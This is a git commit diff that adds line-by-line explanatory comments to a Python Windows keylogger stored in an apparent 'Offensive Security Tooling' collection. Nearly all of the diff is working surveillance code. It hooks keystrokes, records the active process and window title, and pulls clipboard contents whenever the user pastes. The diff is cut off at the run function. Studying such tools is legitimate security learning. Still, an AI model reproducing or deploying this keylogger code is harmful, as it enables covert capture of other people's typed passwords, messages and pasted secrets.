aad17343b446f5cd014ce8bb0b5a9372a824cae4
JMallard93 <mallard.bsn@gmail.com>
2026-09-15 15:26:23 -0400

    Update keylogger.py

--- 01 Offensive Security Tooling (Python)/Endpoint Surveillance/keylogger.py
+++ 01 Offensive Security Tooling (Python)/Endpoint Surveillance/keylogger.py
@@ -1,3 +1,5 @@
+# Windows keylogger, tracks the active application and window title, and extracts text from the system clipboard when the user pastes
+
 from ctypes import byref, create_string_buffer, c_ulong, windll
 from io import StringIO
 
@@ -8,50 +10,56 @@ import sys
 import time
 import win32clipboard
 
-TIMEOUT = 60*10
+TIMEOUT = 60*10 # sets of timeout limit of 10 minutes
 
 class Keylogger:
     def __init__(self):
-        self.current_window = None
+        self.current_window = None # sets current window to None to track context changes
 
+    # capture the active process and window title
     def get_current_process(self):
-        hwnd = windll.user32.GetForegroundWindow()
-        pid = c_ulong(0)
-        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id = f'{pid.value}'
+        hwnd = windll.user32.GetForegroundWindow() # calls the Windows API to get the current focused window
+        pid = c_ulong(0) # initializes a long to store the process ID
+        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # asks Windows what pid owns the active window
+        process_id = f'{pid.value}' # converts the retreived pid from a long to a string
 
-        executable = create_string_buffer(512)
-        
-        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
+        # since we're calling the Windows OS API, we need to act like we're programming in C
+        # we'll need to hand this pointer to the API (which is written in C)
+        executable = create_string_buffer(512) 
+
+        # figure out what process the pid refers to
+        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid) # define a handle to our target process
         windll.psapi.GetModuleBaseNameA(
-                    h_process, None, byref(executable), 512)
-        window_title = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
+                    h_process, None, byref(executable), 512) # grab the base file name of the executable running the process
+        
+        window_title = create_string_buffer(512) # once again we need to create a pointer because we're working with an API written in C
+        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # pulls the title of the active window
         try:
-            self.current_window = window_title.value.decode()
+            self.current_window = window_title.value.decode() # decodes the title into a python string, saving it to the window_title pointer
         except UnicodeDecodeError as e:
-            print(f'{e}: window name unknown')
+            print(f'{e}: window name unknown') # error message if the title can't be found
 
         print('\n', process_id,
-            executable.value.decode(), self.current_window)
+            executable.value.decode(), self.current_window) # print out metadate showing pid, executable name, and window title 
 
-        windll.kernel32.CloseHandle(hwnd)
-        windll.kernel32.CloseHandle(h_process)
+        windll.kernel32.CloseHandle(hwnd) # clean up, closes both handles that we used earlier
+        windll.kernel32.CloseHandle(h_process) # space for handles are limited, so clean up is important
 
+    # triggered every time a key is pressed
     def mykeystroke(self, event):
-        if event.WindowName != self.current_window:
-            self.get_current_process()
-        if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end='')
-        else:
-            if event.Key == 'V':
+        if event.WindowName != self.current_window: # checks if the user has changed windows
+            self.get_current_process() # if they did, grab the new window and process info
+        if 32 < event.Ascii < 127: # checks if the ASCII value is a standard printable character
+            print(chr(event.Ascii), end='') # if it is, print to stdout
+        else: # handles all non printable characters
+            if event.Key == 'V': # catches ctrl + V pasting
                 win32clipboard.OpenClipboard()
-                value = win32clipboard.GetClipboardData()
+                value = win32clipboard.GetClipboardData() # pull whatever text is in the clipboard
                 win32clipboard.CloseClipboard()
-                print(f'[PASTE] - {value}')
+                print(f'[PASTE] - {value}') # save what was pulled out of the clipboard
             else:
-                print(f'{event.Key}')
-        return True
+                print(f'{event.Key}') # save the non-printable key ( [return] or [shift]
+        return True # allow the keystroke event to pass normally to the OS to prevent lag
 
 def run():
     save_stdout = sys.stdout
